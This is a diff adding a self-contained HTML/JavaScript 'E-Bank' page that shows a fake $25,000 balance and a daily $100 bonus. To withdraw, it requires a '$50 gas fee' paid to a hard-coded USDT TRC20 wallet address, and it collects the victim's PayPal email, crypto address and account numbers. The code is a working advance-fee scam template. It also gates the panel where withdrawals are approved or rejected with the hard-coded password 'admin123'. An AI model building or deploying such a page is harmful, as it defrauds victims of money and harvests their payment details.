@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Mini Bank App</title>
+<style>
+body {
+font-family: Arial;
+padding: 20px;
+background: #f5f5f5;
+margin: 0;
+}
+h2 { margin-top: 0; }
+.card {
+background: white;
+padding: 20px;
+border-radius: 10px;
+box-shadow: 0 2px 5px gray;
+margin-bottom: 20px;
+}
+.btn {
+padding: 10px 15px;
+background: teal;
+color: white;
+border: none;
+border-radius: 5px;
+cursor: pointer;
+}
+.btn:hover { background: darkcyan; }
+.modal {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(0,0,0,0.6);
+display: flex;
+justify-content: center;
+align-items: center;
+z-index: 10;
+}
+.modal-content {
+background: white;
+padding: 20px;
+border-radius: 10px;
+width: 90%;
+max-width: 400px;
+position: relative;
+}
+.hidden { display: none; }
+input, select {
+width: 100%;
+padding: 10px;
+margin-top: 10px;
+border: 1px solid #ccc;
+border-radius: 5px;
+}
+.close-btn {
+position: absolute;
+top: 10px;
+right: 10px;
+background: red;
+color: white;
+border: none;
+padding: 5px 10px;
+cursor: pointer;
+}
+
+.topbar {
+display: flex;
+justify-content: flex-end;
+gap: 10px;
+margin-bottom: 15px;
+}
+.icon-btn {
+position: relative;
+background: none;
+border: none;
+cursor: pointer;
+}
+.icon-btn img {
+width: 28px;
+height: 28px;
+}
+.badge {
+position: absolute;
+top: -5px;
+right: -5px;
+background: red;
+color: white;
+font-size: 10px;
+border-radius: 50%;
+padding: 2px 5px;
+}
+.dropdown {
+position: absolute;
+top: 35px;
+right: 0;
+background: white;
+border: 1px solid #ccc;
+border-radius: 5px;
+width: 250px;
+box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+z-index: 99;
+}
+.dropdown ul {
+list-style: none;
+padding: 10px;
+margin: 0;
+max-height: 200px;
+overflow-y: auto;
+}
+.dropdown ul li {
+padding: 5px 0;
+border-bottom: 1px solid #eee;
+font-size: 14px;
+}
+.copy-row {
+display: flex;
+align-items: center;
+justify-content: space-between;
+gap: 10px;
+margin-top: 10px;
+background: #f0f0f0;
+padding: 8px;
+border-radius: 5px;
+word-break: break-all;
+}
+.copy-btn {
+font-size: 14px;
+padding: 5px 10px;
+cursor: pointer;
+border: none;
+background: #007bff;
+color: white;
+border-radius: 3px;
+}
+</style>
+</head>
+<body>
+
+<!-- Top Bar -->
+<div class="topbar">
+<button class="icon-btn" onclick="toggleNotifications()">
+<img src="https://cdn-icons-png.flaticon.com/512/1827/1827392.png" alt="Notifications"/>
+<span id="notifBadge" class="badge hidden">!</span>
+<div id="notifDropdown" class="dropdown hidden">
+<ul id="notifList"></ul>
+</div>
+</button>
+<button class="icon-btn" onclick="alert('Profile Page Coming Soon!')">
+<img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="Profile"/>
+</button>
+</div>
+
+<!-- Main Card -->
+<div class="card">
+<h2>Welcome to E-Bank</h2>
+<p><strong>Balance:</strong> $<span id="balance">25000</span></p>
+<button class="btn" onclick="openWithdraw()">Withdraw</button>
+<button class="btn" onclick="claimDaily()">🎁 Daily Claim</button>
+<button class="btn" onclick="toggleAdmin()">Admin</button>
+</div>
+
+<!-- Transaction History -->
+<div class="card">
+<h3>Transaction History</h3>
+<ul id="history"></ul>
+</div>
+
+<!-- Withdraw Modal -->
+<div id="withdrawModal" class="modal hidden">
+<div class="modal-content">
+<button class="close-btn" onclick="closeWithdraw()">x</button>
+<h3>Withdraw Funds</h3>
+<input type="number" id="withdrawAmount" placeholder="Enter amount" />
+<select id="method">
+<option value="">Select method</option>
+<option value="PayPal">PayPal</option>
+<option value="Crypto">Crypto</option>
+<option value="Credit Card">Credit Card</option>
+</select>
+<input type="text" id="details" placeholder="paypal email/usdt address" />
+<input type="text" id="accountNumber" placeholder="Enter account number/Network name eg,trc20,erc20" />
+<button class="btn" onclick="confirmWithdraw()">Continue</button>
+</div>
+</div>
+
+<!-- Gas Modal -->
+<div id="gasModal" class="modal hidden">
+<div class="modal-content">
+<button class="close-btn" onclick="closeGas()">x</button>
+<h3>⚠️ Gas Fee Required</h3>
+<p>To withdraw <strong id="pendingAmt"></strong>, you must pay a $50 gas fee to this address:</p>
+
+<div class="copy-row">
+<span id="usdtAddress">TJcVfrTA42vZhYvxPugfcx1wQDM2xp2pTW</span>
+<button class="copy-btn" onclick="copyText('usdtAddress')">usdt trc20</button>
+</div>
+
+<button class="btn" onclick="finalizeWithdraw()">✅ I have paid</button>
+</div>
+</div>
+
+<!-- Admin Modal -->
+<div id="adminModal" class="modal hidden">
+<div class="modal-content">
+<button class="close-btn" onclick="closeAdmin()">x</button>
+<h3>Admin Panel</h3>
+<ul id="adminList"></ul>
+</div>
+  <div class="copy-row">
+<span id="usdtAddress">TJcVfrTA42vZhYvxPugfcx1wQDM2xp2pTW</span>
+<button class="copy-btn" onclick="copyText('usdtAddress')">Copy</button>
+</div>
+
+<div class="copy-row">
+<span id="copyAccount">None</span>
+<button class="copy-btn" onclick="copyText('copyAccount')">Copy</button>
+</div>
+</div>
+
+<script>
+let currentUser = { email: "test@example.com" }; // Mock for testing
+let balance = 25000;
+let dailyClaimed = false;
+let history = [];
+let withdrawals = [];
+let notifications = [];
+
+function updateUI() {
+document.getElementById("balance").textContent = balance;
+const hist = document.getElementById("history");
+hist.innerHTML = "";
+history.forEach(h => {
+const li = document.createElement("li");
+li.textContent = h;
+hist.appendChild(li);
+});
+updateNotifications();
+}
+
+function openWithdraw() {
+document.getElementById("withdrawModal").classList.remove("hidden");
+}
+function closeWithdraw() {
+document.getElementById("withdrawModal").classList.add("hidden");
+}
+function confirmWithdraw() {
+const amt = parseFloat(document.getElementById("withdrawAmount").value);
+const method = document.getElementById("method").value;
+const details = document.getElementById("details").value;
+const acctNum = document.getElementById("accountNumber").value;
+
+if (!amt || !method || !details || !acctNum) {
+alert("Fill all fields.");
+return;
+}
+if (amt > balance) {
+alert("Insufficient balance.");
+return;
+}
+
+sessionStorage.setItem("pendingWithdraw", JSON.stringify({ amt, method, details, acctNum }));
+document.getElementById("pendingAmt").textContent = `$${amt}`;
+document.getElementById("copyAccount").textContent = acctNum;
+
+closeWithdraw();
+document.getElementById("gasModal").classList.remove("hidden");
+}
+function closeGas() {
+document.getElementById("gasModal").classList.add("hidden");
+}
+function finalizeWithdraw() {
+const { amt, method, details } = JSON.parse(sessionStorage.getItem("pendingWithdraw"));
+balance -= amt;
+withdrawals.push({ amount: amt, method, details, status: "Pending" });
+const msg = `🕒 Pending withdrawal of $${amt} via ${method}`;
+history.push(msg);
+notifications.push(msg);
+updateUI();
+closeGas();
+sessionStorage.removeItem("pendingWithdraw");
+}
+function toggleAdmin() {
+const admin = document.getElementById("adminModal");
+if (admin.classList.contains("hidden")) {
+const pass = prompt("Enter admin password:");
+if (pass === "admin123") {
+admin.classList.remove("hidden");
+renderAdminList();
+} else alert("Access Denied.");
+} else admin.classList.add("hidden");
+}
+function renderAdminList() {
+const list = document.getElementById("adminList");
+list.innerHTML = "";
+withdrawals.forEach((w, i) => {
+const li = document.createElement("li");
+li.innerHTML = `${w.status} - $${w.amount} via ${w.method}
+<button onclick="approve(${i})">✔</button>
+<button onclick="reject(${i})">✖</button>`;
+list.appendChild(li);
+});
+}
+function approve(i) {
+withdrawals[i].status = "✅ Approved";
+history.push(`✅ Approved $${withdrawals[i].amount}`);
+updateUI(); renderAdminList();
+}
+function reject(i) {
+const amt = withdrawals[i].amount;
+balance += amt;
+withdrawals[i].status = "❌ Rejected";
+history.push(`❌ Rejected $${amt}`);
+updateUI(); renderAdminList();
+}
+function closeAdmin() {
+document.getElementById("adminModal").classList.add("hidden");
+}
+
+function claimDaily() {
+if (dailyClaimed) return alert("Already claimed today.");
+balance += 100;
+dailyClaimed = true;
+history.push("🎁 Claimed daily $100");
+notifications.push("🎁 Claimed daily $100");
+updateUI();
+alert("You got $100!");
+}
+function toggleNotifications() {
+document.getElementById("notifDropdown").classList.toggle("hidden");
+}
+function updateNotifications() {
+const badge = document.getElementById("notifBadge");
+const list = document.getElementById("notifList");
+list.innerHTML = "";
+notifications.slice().reverse().forEach(n => {
+const li = document.createElement("li");
+li.textContent = n;
+list.appendChild(li);
+});
+badge.classList.toggle("hidden", notifications.length === 0);
+}
+function copyText(id) {
+const text = document.getElementById(id).textContent;
+navigator.clipboard.writeText(text)
+.then(() => alert("Copied!"))
+.catch(() => alert("Failed to copy"));
+}
+
+window.onload = () => {
+sessionStorage.removeItem("pendingWithdraw");
+updateUI();
+};
+</script>
+
+</body>
+</html>
